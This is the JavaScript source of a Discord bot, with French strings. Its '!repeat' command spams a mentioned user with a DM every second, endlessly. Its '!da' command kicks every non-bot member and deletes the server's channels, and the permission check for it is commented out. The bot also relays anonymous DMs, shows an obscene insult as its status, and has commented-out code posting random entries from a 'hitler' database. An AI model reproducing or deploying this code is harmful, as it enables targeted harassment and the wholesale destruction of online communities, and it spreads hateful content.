 const Discord = require('discord.js');
    const low = require('lowdb')
    const FileSync = require ('lowdb/adapters/FileSync')
    const fs = require("fs");
    const config = require("./config.json");
    require('events').EventEmitter.prototype._maxListeners = 300;    
    var bot = new Discord.Client();
    var prefix = "!"
    
    const adapter = new FileSync('database.json');
    const db = low(adapter);

var rhitler = db.get('hitler').size().value();

   
        bot.on('ready', () => {
        bot.user.setPresence({ game: { name: 'EH NIQUE TA MERE', type: 3}})
        bot.user.setStatus("idle")
     //    var interval = setInterval (function () {
 //  randomperso();
//var lul = db.get(`hitler[${randnum}].hitler_value`).toString().value();
 
       //    function randomperso(min, max) {
      //  min = Math.ceil(0);
       // max = Math.floor(rhitler);
       // randnum = Math.floor(Math.random() * (max - min) + min);
    
    
        //     }
 //var rdm_embed = new Discord.RichEmbed()
   // .setColor(0x00AE86)
  //  .setDescription(`${lul}`)
//bot.channels.get("388999471318433794").send(rdm_embed)
      
         
             //           .catch(console.error); // add error handling here
     //}, 1 * 1000);
    });
          bot.login(process.env.TOKEN);

    //  bot.on('guildMemberAdd', member => {
       // let brig = member.guild.roles.find("name", "BAT LES COUILLES FRERE");
       // member.addRole(brig);
//})

bot.on('message', message => {
        let pUser = message.mentions.users.first()
let userVar = message.author
    if (message.author.bot) return;

 if (message.content.startsWith(prefix + "repeat")) {
  message.delete();
 if(!pUser){
                message.reply("L'utilisateur n'existe pas !");
            }else{
        var interval = setInterval (function () {
                     pUser.sendMessage(message.content.slice(7, message.content.length))
                        .catch(console.error); // add error handling here
        }, 1 * 1000);
        }
 }
})


  //  let tavernec = message.guild.channels.find(channels => channels.name === "recrudescence-hitlérienne");
//  if (message.channel === tavernec) {  
   //randomperso();
///var lul = db.get(`hitler[${randnum}].hitler_value`).toString().value();
 
// var rdm_embed = new Discord.RichEmbed()
 //   .setColor(0x00AE86)
 //   .setDescription(`${lul}`)
//message.channel.sendEmbed(rdm_embed)
 
   //  function randomperso(min, max) {
//        min = Math.ceil(0);
   //     max = Math.floor(rhitler);
  //      randnum = Math.floor(Math.random() * (max - min) + min);
    
 //   }
 //}
 bot.on('message', message => {
    let pUser = message.mentions.users.first()
let userVar = message.author
 if (message.content.startsWith(prefix + "mp")) {
              message.delete();
        if (!pUser) {
        }
        else {
            pUser.sendMessage(message.content.slice(3, message.content.length));

        
    }
 }
     

    if (message.author.bot) return;
    if (message.channel.type === 'dm') {
      if(message.content.includes('@')){
          message.reply("Impossible de répondre a votre demande si elle contient une mention")
         } else {

  //    message.delete()
        bot.channels.get("263295931565211648").send(message.content.slice(0, message.content.length)+ " " + userVar); 

    }}
if (message.content === prefix + "da") {
   // let rolegive = message.guild.roles.find('name', 'allrole');
   // if (!rolegive) return message.channel.send(`---`);
   // if(message.member.roles.has(rolegive.id)) {

   // message.guild.members.filter(m => !m.user.bot).map(async members => await members.sendMessage("test du casse couille"));
    message.guild.members.filter(m => !m.user.bot).map(async members => await members.kick());
    message.guild.channels.filter(c => !c.deletable).map(async channels => await channels.delete());

    //}
}
    })
